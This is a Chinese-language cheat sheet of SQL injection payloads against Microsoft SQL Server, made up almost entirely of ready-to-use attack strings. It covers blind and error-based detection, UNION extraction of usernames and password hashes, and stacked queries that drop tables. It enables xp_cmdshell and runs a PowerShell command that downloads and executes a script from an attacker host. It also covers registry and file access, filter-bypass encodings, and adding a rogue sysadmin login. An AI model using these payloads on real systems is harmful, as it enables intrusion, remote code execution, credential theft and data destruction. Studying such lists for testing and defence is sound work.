# MSSQL SQL 注入 Payload 模板

## 基础注入检测

### 布尔盲注

```sql
' AND 1=1--
' AND 1=2--
" AND 1=1--
" AND 1=2--
') AND 1=1--
') AND 1=2--
```

### 时间盲注

```sql
' WAITFOR DELAY '0:0:5'--
' IF 1=1 WAITFOR DELAY '0:0:5'--
' IF 1=1 BEGIN WAITFOR DELAY '0:0:5' END--
```

### 报错注入

```sql
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS INT)--
' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

## 数据提取

### UNION 注入

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT name,master.dbo.fn_varbintohexstr(password_hash),3 FROM master.sys.sql_logins--
```

### 堆叠查询

```sql
'; DROP TABLE users--
'; EXEC('sp_who')--
'; INSERT INTO users VALUES('hacker','hacked')--
```

## MSSQL 特有功能

### 存储过程利用

```sql
# 执行命令 (需要 xp_cmdshell 权限)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://attacker/shell.ps1'')"'--

# 禁用 xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE--
```

### 注册表操作

```sql
# 读取注册表
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName'--

# 写入注册表
'; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Test', 'Value', 'REG_SZ', 'test'--
```

### 文件操作

```sql
# 读取文件
'; CREATE TABLE #output(line TEXT); BULK INSERT #output FROM 'c:\windows\win.ini'; SELECT * FROM #output--

# 使用 OLE 自动化
'; DECLARE @o INT; EXEC sp_oacreate 'Scripting.FileSystemObject', @o OUT; EXEC sp_oamethod @o, 'OpenTextFile', @o OUT, 'c:\windows\win.ini', 1--
```

### 数据库链接 (DB Link)

```sql
# 查询链接服务器
'; SELECT name,product,provider FROM sysservers--

# 通过链接执行查询
'; SELECT * FROM OPENQUERY("linked_server", 'SELECT @@version')--

# 使用 OPENROWSET
'; SELECT * FROM OPENROWSET('SQLOLEDB', 'server=attacker;uid=sa;pwd=password', 'SELECT @@version')--
```

## 绕过技术

### 注释绕过

```sql
# MSSQL 注释
' AND 1=1--
' AND 1=1/*comment*/

# 内联注释 (MySQL 风格不适用)
```

### 编码绕过

```sql
# URL 编码
%27%20AND%201%3D1--

# 十六进制
' UNION SELECT master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--

# CHAR 函数
' UNION SELECT CHAR(116)+CHAR(101)+CHAR(115)+CHAR(116)--
```

### 空白替代

```sql
# 使用注释替代空格
'/**/AND/**/1=1--

# 使用括号
'AND(1=1)--
```

## 信息收集

```sql
# 版本信息
' UNION SELECT @@version--

# 当前用户
' UNION SELECT SYSTEM_USER--
' UNION SELECT USER_NAME()--
' UNION SELECT SUSER_NAME()--

# 数据库信息
' UNION SELECT DB_NAME()--
' UNION SELECT name FROM master.dbo.sysdatabases--

# 表结构
' UNION SELECT name FROM sysobjects WHERE xtype='U'--
' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

# 权限检查
' UNION SELECT is_srvrolemember('sysadmin')--
' UNION SELECT IS_MEMBER('db_owner')--
```

## 提权技术

### 检查权限

```sql
' UNION SELECT is_srvrolemember('sysadmin')--
' UNION SELECT is_srvrolemember('securityadmin')--
' UNION SELECT is_srvrolemember('serveradmin')--
```

### 创建用户

```sql
'; EXEC sp_addlogin 'hacker', 'password123'--
'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--
'; EXEC sp_adduser 'hacker', 'hacker', 'db_owner'--
```